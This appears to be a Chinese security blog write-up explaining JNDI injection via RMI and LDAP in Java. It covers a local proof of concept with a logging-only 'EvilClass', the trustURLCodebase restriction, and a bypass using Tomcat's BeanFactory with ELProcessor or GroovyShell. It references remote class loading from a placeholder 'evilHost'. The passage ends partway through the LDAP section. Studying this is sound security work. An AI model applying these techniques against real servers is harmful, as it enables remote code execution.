<p>因为绑定的是 <code>Reference</code> 对象，客户端在本地 <code>CLASSPATH</code> 查找 <code>Exploit</code> 类，如果没有则根据设定的 <code>Reference</code> 属性，到<code>URL</code>： <a target="_blank" rel="noopener" href="http://evilhost/Exploit.class">http://evilHost/Exploit.class</a> 获取构造对象实例，构造方法中的恶意代码就会被执行</p>
<h2 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI_RMI"></a>JNDI_RMI</h2><h3 id="低版本JDK运行"><a href="#低版本JDK运行" class="headerlink" title="低版本JDK运行"></a>低版本JDK运行</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Client</span><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">lookup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/foo&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;ret&quot;</span>+lookup);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<blockquote>
<p>“foo”并不是一个类，而是在服务器端绑定到 RMI 注册表上的一个对象名称（Object name）。当客户端使用 <code>InitialContext().lookup(&quot;rmi://127.0.0.1:1099/foo&quot;)</code> 查找时，它会返回该名称下对应的对象，即 <code>EvilClass</code>。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Server</span><br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        String url=<span class="hljs-string">&quot;http://localhost:1098/&quot;</span>;<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;EvilClass&quot;</span>, <span class="hljs-string">&quot;EvilClass&quot;</span>, url);<br>        registry.bind(<span class="hljs-string">&quot;foo&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference));<br>        System.out.println(<span class="hljs-string">&quot;server ready&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//EvilClass</span><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Name;<br><span class="hljs-keyword">import</span> javax.naming.spi.ObjectFactory;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClass</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String key)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;EvilClass&quot;</span>+key);<br>    &#125;<br><br>    &#123;<br>        EvilClass.log(<span class="hljs-string">&quot;IIB block&quot;</span>);<br>    &#125;<span class="hljs-comment">//在创建对象时执行</span><br><br>    <span class="hljs-keyword">static</span> &#123;<br>        EvilClass.log(<span class="hljs-string">&quot;static block&quot;</span>);<br>    &#125;<span class="hljs-comment">//在类第一次加载时执行</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        EvilClass.log(<span class="hljs-string">&quot;getObjectInstance&quot;</span>);<br>        <span class="hljs-keyword">return</span>  <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>python启动http服务器</p>
<p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027659.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230226191821488"> </p>
<blockquote>
<p>关于这里的端口号有的是1098有的是1099的疑问</p>
<p>这是因为在服务器端代码 <code>Server.java</code> 中，创建 <code>Reference</code> 对象时，将 <code>url</code> 参数设置为了 <code>&quot;http://localhost:1098/&quot;</code>。这个 URL 是指向一个 HTTP 服务器的地址，而在 <code>getObjectInstance</code> 方法中，并没有使用该 URL，所以在客户端代码中使用 <code>rmi://127.0.0.1:1099/foo</code> 查找时仍然可以返回正确的对象。</p>
<p>虽然这个示例代码中的 <code>url</code> 参数没有被实际使用到，但是实际上 <code>url</code> 参数用来指定引用对象的远程位置，这个远程位置可以是任何类型的 URL。如果您想要将 <code>url</code> 参数用于远程加载对象，则需要确保在 <code>getObjectInstance</code> 方法中能够正确地解析该 URL，加载对应的对象。</p>
</blockquote>
<p>将EvilClass的.class文件放入服务器根目录</p>
<p><img src="D:/mdimage/image-20230226192019661.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230226192019661"> </p>
<p>启动服务端</p>
<p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027009.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230226192035548"> </p>
<p>启动客户端</p>
<p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027472.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230226192046711"> </p>
<h3 id="高版本JDK运行"><a href="#高版本JDK运行" class="headerlink" title="高版本JDK运行"></a>高版本JDK运行</h3><p><code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认值为<code>false</code>，运行时需加入参数 <code>-Dcom.sun.jndi.rmi.object.trustURLCodebase=true</code> 。因为如果 <code>JDK</code> 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 <code>RMI</code> 代码。<br>不加参数，抛出异常：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192034081.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230226193613482"> </p>
<p>版本8u351</p>
<p>经过我的一番苦苦调试（终于tm学会调试了），发现问题出在这里</p>
<p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192028480.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230228212541157"> </p>
<p>加入参数后即可正常运行</p>
<h4 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h4><p>其中 <code>getFactoryClassLocation()</code>方法是获取<code>classFactoryLocation</code>地址，可以看到，在 <code>ref != null &amp;&amp; ref.getFactoryClassLocation() != null</code> 的情况下，会对 <code>trustURLCodebase</code> 进行取反，由于在 <code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 版本及以后， <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认为 <code>false</code> ，所以会进入 <code>if</code> 语句，抛出异常。</p>
<h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>如果要解码的对象 <code>r</code> 是远程引用，就需要先解引用然后再调用 <code>NamingManager.getObjectInstance</code>，其中会实例化对应的 <code>ObjectFactory</code> 类并调用其 <code>getObjectInstance</code> 方法，这也符合我们前面打印的 <code>EvilClass</code> 的执行顺序。</p>
<p>因此为了绕过这里 <code>ConfigurationException</code> 的限制，我们有三种方法: 令 <code>ref</code> 为空，或者 令 <code>ref.getFactoryClassLocation()</code> 为空，或者 * 令 <code>trustURLCodebase</code> 为 <code>true</code></p>
<p>方法一，令var8为空，语义上看需要 <code>obj</code> 既不是 <code>Reference</code> 也不是 <code>Referenceable</code>。即，不能是对象引用，只能是原始对象，这时候客户端直接实例化本地对象，远程 <code>RMI</code> 没有操作的空间，因此这种情况不太好利用；</p>
<p>方法二：令 <code>ref.getFactoryClassLocation()</code> 返回空。即，让 <code>ref</code> 对象的 <code>classFactoryLocation</code> 属性为空，这个属性表示引用所指向对象的对应 <code>factory</code> 名称，对于远程代码加载而言是 <code>codebase</code>，即远程代码的 <code>URL</code> 地址(可以是多个地址，以空格分隔)，这正是我们上文针对低版本的利用方法；如果对应的 <code>factory</code> 是本地代码，则该值为空，这是绕过高版本 <code>JDK</code> 限制的关键；</p>
<p>方法三：我们已经在上节用过，即在命令行指定 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 参数。</p>
<p>那就去看看<code>getFactoryClassLocation()</code>方法，以及返回值的赋值情况。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getFactoryClassLocation</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> classFactoryLocation;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Reference</span><span class="hljs-params">(String className, String factory, String factoryLocation)</span> &#123;<br>    <span class="hljs-built_in">this</span>(className);<br>    classFactory = factory;<br>    classFactoryLocation = factoryLocation;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Reference</span><span class="hljs-params">(String className, RefAddr addr,</span><br><span class="hljs-params">                 String factory, String factoryLocation)</span> &#123;<br>    <span class="hljs-built_in">this</span>(className, addr);<br>    classFactory = factory;<br>    classFactoryLocation = factoryLocation;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>要满足方法二情况，即让<code>ref.getFactoryClassLocation()</code> 返回空，我们只需要在远程 <code>RMI</code> 服务器返回的 <code>Reference</code> 对象中不指定 <code>Factory</code> 的 <code>codebase</code>。</p>
<p>它是负责根据 Reference 对象创建相应的 <code>ObjectFactory</code> 对象，并调用其 <code>getObjectInstance()</code> 方法来生成目标对象的类。</p>
<p>接着看一下 <code>javax.naming.spi.NamingManager</code> 的解析过程</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object<br>    <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object refInfo, Name name, Context nameCtx,</span><br><span class="hljs-params">                      Hashtable&lt;?,?&gt; environment)</span><br>    <span class="hljs-keyword">throws</span> Exception<br>&#123;<br><br>    ObjectFactory factory;<br><br>    <span class="hljs-comment">// Use builder if installed</span><br>    <span class="hljs-type">ObjectFactoryBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> getObjectFactoryBuilder();<br>    <span class="hljs-keyword">if</span> (builder != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// builder must return non-null factory</span><br>        factory = builder.createObjectFactory(refInfo, environment);<br>        <span class="hljs-keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,<br>            environment);<br>    &#125;<br><br>    <span class="hljs-comment">// Use reference if possible</span><br>    <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Reference) &#123;<br>        ref = (Reference) refInfo;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Referenceable) &#123;<br>        ref = ((Referenceable)(refInfo)).getReference();<br>    &#125;<br><br>    Object answer;<br><br>    <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ref.getFactoryClassName();<br>        <span class="hljs-keyword">if</span> (f != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// if reference identifies a factory, use exclusively</span><br><br>            factory = getObjectFactoryFromReference(ref, f);<br>            <span class="hljs-keyword">if</span> (factory != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,<br>                                                 environment);<br>            &#125;<br>            <span class="hljs-comment">// No factory found, so return original refInfo.</span><br>            <span class="hljs-comment">// Will reach this point if factory class is not in</span><br>            <span class="hljs-comment">// class path and reference does not contain a URL for it</span><br>            <span class="hljs-keyword">return</span> refInfo;<br><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// if reference has no factory, check for addresses</span><br>            <span class="hljs-comment">// containing URLs</span><br><br>            answer = processURLAddrs(ref, name, nameCtx, environment);<br>            <span class="hljs-keyword">if</span> (answer != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> answer;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// try using any specified factories</span><br>    answer =<br>        createObjectFromFactories(refInfo, name, nameCtx, environment);<br>    <span class="hljs-keyword">return</span> (answer != <span class="hljs-literal">null</span>) ? answer : refInfo;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到，在处理 <code>Reference</code> 对象时，会先调用 <code>ref.getFactoryClassName()</code> 获取对应工厂类的名称，也就是会先从本地的<code>CLASSPATH</code>中寻找该类。如果不为空则直接实例化工厂类，并通过工厂类去实例化一个对象并返回；如果为空则通过网络去请求，即前文中的情况。</p>
<p>之后会执行静态代码块、代码块、无参构造函数和<code>getObjectInstance</code>方法。那么只需要在攻击者本地<code>CLASSPATH</code>找到这个<code>Reference Factory</code>类并且在这四个地方其中一块能执行<code>payload</code>就可以了。但<code>getObjectInstance</code>方法需要你的类实现<code>javax.naming.spi.ObjectFactory</code>接口<br>因此，我们实际上可以指定一个存在于目标 <code>classpath</code> 中的工厂类名称，交由这个工厂类去实例化实际的目标类(即引用所指向的类)，从而间接实现一定的代码控制。<br>整个利用过程的主要调用栈如下：</p>
<figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs leaf">InitialContext<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">lookup</span><span class="hljs-params">()</span></span><br>  RegistryContext<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">lookup</span><span class="hljs-params">()</span></span><br>    RegistryContext<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">decodeObject</span><span class="hljs-params">()</span></span><br>      NamingManager<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getObjectInstance</span><span class="hljs-params">()</span></span><br>          objectfactory = NamingManager<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getObjectFactoryFromReference</span><span class="hljs-params">()</span></span><br>                  Class<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newInstance</span><span class="hljs-params">()</span></span>  //--&gt;恶意代码被执行<br>     或:   objectfactory<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getObjectInstance</span><span class="hljs-params">()</span></span>  //--&gt;恶意代码被执行<br></code></pre></td></tr></table></figure>

<p>总结一下<br>满足要求的工厂类条件： 存在于目标本地的 <code>CLASSPATH</code> 中实现 <code>javax.naming.spi.ObjectFactory</code> 接口 至少存在一个 <code>getObjectInstance()</code> 方法</p>
<p>而存在于 <code>Tomcat</code> 依赖包中的 <code>org.apache.naming.factory.BeanFactory</code> 就是个不错的选择<br><code>org.apache.naming.factory.BeanFactory</code> ，这个类在 <code>Tomcat</code> 中，很多 <code>web</code> 应用都会包含，它的关键代码：</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs sqf">public <span class="hljs-built_in">Object</span> getObjectInstance(<span class="hljs-built_in">Object</span> obj, <span class="hljs-built_in">Name</span> <span class="hljs-built_in">name</span>, Context nameCtx,<br>                                Hashtable&lt;?,?&gt; environment)<br>    throws NamingException &#123;<br><br>    Reference ref = (Reference) obj;<br>    String beanClassName = ref.getClassName();<br>    ClassLoader tcl = Thread.currentThread().getContextClassLoader();<br>    <span class="hljs-comment">// 1. 反射获取类对象</span><br>    <span class="hljs-keyword">if</span> (tcl != null) &#123;<br>        beanClass = tcl.loadClass(beanClassName);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        beanClass = Class.forName(beanClassName);<br>    &#125;<br>    <span class="hljs-comment">// 2. 初始化类实例</span><br>    <span class="hljs-built_in">Object</span> bean = beanClass.getConstructor().newInstance();<br><br>    <span class="hljs-comment">// 3. 根据 Reference 的属性查找 setter 方法的别名</span><br>    RefAddr ra = ref.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;forceString&quot;</span>);<br>    String value = (String)ra.getContent();<br><br>    <span class="hljs-comment">// 4. 循环解析别名并保存到字典中</span><br>    <span class="hljs-keyword">for</span> (String <span class="hljs-built_in">param</span>: value.split(<span class="hljs-string">&quot;,&quot;</span>)) &#123;<br>        <span class="hljs-built_in">param</span> = <span class="hljs-built_in">param</span>.<span class="hljs-built_in">trim</span>();<br>        index = <span class="hljs-built_in">param</span>.indexOf(<span class="hljs-string">&#x27;=&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-number">0</span>) &#123;<br>            setterName = <span class="hljs-built_in">param</span>.substring(index + <span class="hljs-number">1</span>).<span class="hljs-built_in">trim</span>();<br>            <span class="hljs-built_in">param</span> = <span class="hljs-built_in">param</span>.substring(<span class="hljs-number">0</span>, index).<span class="hljs-built_in">trim</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            setterName = <span class="hljs-string">&quot;set&quot;</span> +<br>                <span class="hljs-built_in">param</span>.substring(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>).toUpperCase(Locale.ENGLISH) +<br>                <span class="hljs-built_in">param</span>.substring(<span class="hljs-number">1</span>);<br>        &#125;<br>        forced.put(<span class="hljs-built_in">param</span>, beanClass.getMethod(setterName, paramTypes));<br>    &#125;<br><br>    <span class="hljs-comment">// 5. 解析所有属性，并根据别名去调用 setter 方法</span><br>    Enumeration&lt;RefAddr&gt; e = ref.getAll();<br>    <span class="hljs-keyword">while</span> (e.hasMoreElements()) &#123;<br>        ra = e.nextElement();<br>        String propName = ra.getType();<br>        String value = (String)ra.getContent();<br>        <span class="hljs-built_in">Object</span>[] valueArray = new <span class="hljs-built_in">Object</span>[<span class="hljs-number">1</span>];<br>        Method method = forced.<span class="hljs-built_in">get</span>(propName);<br>        <span class="hljs-keyword">if</span> (method != null) &#123;<br>            valueArray[<span class="hljs-number">0</span>] = value;<br>            method.invoke(bean, valueArray);<br>        &#125;<br>        <span class="hljs-comment">// ...</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>上面注释标注了关键的部分，我们可以通过在返回给客户端的 <code>Reference</code> 对象的 <code>forceString</code> 字段指定 <code>setter</code> 方法的别名，并在后续初始化过程中进行调用。<br><code>forceString</code> 的格式为 <code>a=foo,bar</code>，以逗号分隔每个需要设置的属性，如果包含等号，则对应的 <code>setter</code> 方法为等号后的值 <code>foo</code>，如果不包含等号，则 <code>setter</code> 方法为默认值 <code>setBar</code>。<br>在后续调用时，调用 <code>setter</code> 方法使用单个参数，且参数值为对应属性对象 <code>RefAddr</code> 的值 (<code>getContent</code>)。因此，实际上我们可以调用任意指定类的任意方法，并指定单个可控的参数。</p>
<p>因为使用 <code>newInstance</code>创建实例（也就是后面<code>Poc</code>中的<code>ELProcessor</code>），所以只能调用无参构造，这就要求目标 <code>class</code> 得有无参构造方法，上面 <code>forceString</code> 可以给属性强制指定一个 <code>setter</code> 方法，参数为一个 <code>String</code> 类型<br>于是找到 <code>javax.el.ELProcessor</code> 作为目标 <code>class</code>，利用 <code>el</code> 表达式执行命令，工具 <a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Bypass">JNDI-Injection-Bypass</a> 中的 <code>EvilRMIServer.java</code> 部分代码如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192031866.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="zongjie3.png"> </p>
<p>所以整个绕过流程就是：<br>为了绕过<code>ConfigurationException</code>，需要满足<code>ref.getFactoryClassLocation()</code> 为空，只需要在远程 <code>RMI</code> 服务器返回的 <code>Reference</code> 对象中不指定 <code>Factory</code> 的 <code>codebase</code></p>
<p>之后去分析<code>Reference</code>的调用过程，来到<code>NamingManager</code>，需要在攻击者本地<code>CLASSPATH</code>找到这个<code>Reference Factory</code>类并且在其中一块代码能执行<code>payload</code>，找到了<code>BeanFactory</code><br><code>BeanFactor</code>使用<code>newInstance</code>创建实例，所以只能调用无参构造，这就要求目标 <code>class</code> 得有无参构造方法且有办法执行相关命令，于是找到<code>ELProcessor</code>和<code>GroovyShell</code><br>总结起来就是绕过了<code>ConfigurationException</code>，进入<code>NamingManager</code>，使用<code>BeanFactor</code>创建<code>ELProcessor</code>&#x2F;<code>GroovyShell</code>无参实例，然后<code>BeanFactor</code>根据别名去调用方法（执行<code>ELProcessor</code>中的<code>eval</code>方法）</p>
<p>从代码中能看出该工具还有另一个利用方法，<code>groovy.lang.GroovyShell</code>，原理也是类似的</p>
<p>传入的 <code>Reference</code>为 <code>ResourceRef</code> 类，后面通过反射的方式实例化 <code>Reference</code> 所指向的任意 <code>Bean Class</code>，调用 <code>setter</code> 方法为所有的属性赋值，该 <code>Bean Class</code> 的类名、属性、属性值，全都来自于 <code>Reference</code> 对象。<code>ResourceRef</code>构造器的第七个参数<code>factoryLocation</code>是远程加载<code>factory</code>的地址，比如是一个<code>url</code>,这里将其设置为<code>null</code>,达到绕过<code>ConfigurationException</code>限制。</p>
<h2 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI_LDAP"></a>JNDI_LDAP</h2><h3 id="低版本JDK运行-1"><a href="#低版本JDK运行-1" class="headerlink" title="低版本JDK运行"></a>低版本JDK运行</h3><p>这里使用marshalsec来启动ldap服务端</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">mvn clean <span class="hljs-keyword">package</span> <span class="hljs-title">-DskipTests</span><br></code></pre></td></tr></table></figure>

<p>编译生成可执行jar包</p>
<p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192031505.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230309202850493">启动服务端</p>
<p>客户端代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">lookup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(<span class="hljs-string">&quot;ldap://127.0.0.1:1389/foo&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;ret&quot;</span>+lookup);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>使用jdk8u65时</p>
<p><img src="D:/mdimage/image-20230309203535976.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230309203535976"> </p>
<p><code>JNDI</code>发起<code>ldap</code>的<code>lookup</code>后，将有如下的调用流程，这里我们直接来关注，获得远程<code>LDAP Server</code>的<code>Entry</code>之后，<code>Client</code>这边是怎么做处理的</p>
<p><img src="D:/mdimage/image-20230309211408157.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230309211408157"> </p>
